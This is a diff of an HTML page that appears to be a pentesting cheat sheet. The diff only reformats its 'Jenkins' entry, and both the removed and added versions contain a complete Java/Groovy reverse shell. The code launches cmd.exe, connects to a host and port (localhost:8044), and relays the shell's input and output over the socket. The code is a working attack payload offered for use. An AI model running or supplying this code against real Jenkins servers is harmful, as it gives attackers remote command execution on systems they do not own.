@@ -25,9 +25,10 @@
 </ul>
 <p>Jenkins</p>
 <ul>
-<li>Reverse shell:<pre><code><span class="hljs-keyword">String</span> host=<span class="hljs-string">"localhost"</span>;
-<span class="hljs-keyword">int</span> port=<span class="hljs-number">8044</span>;
-<span class="hljs-keyword">String</span> cmd=<span class="hljs-string">"cmd.exe"</span>;
-<span class="hljs-built_in">Process</span> p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=<span class="hljs-keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-built_in">while</span>(!s.isClosed()){<span class="hljs-built_in">while</span>(pi.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pi.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(pe.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pe.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(si.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)po.<span class="hljs-built_in">write</span>(si.<span class="hljs-built_in">read</span>());so.<span class="hljs-built_in">flush</span>();po.<span class="hljs-built_in">flush</span>();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-built_in">try</span> {p.<span class="hljs-built_in">exitValue</span>();<span class="hljs-built_in">break</span>;}<span class="hljs-built_in">catch</span> (Exception e){}};p.destroy();s.<span class="hljs-built_in">close</span>();
-</code></pre></li>
+<li>Reverse shell:</li>
 </ul>
+<pre><code>String host=&quot;localhost&quot;;
+int port=8044;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre>
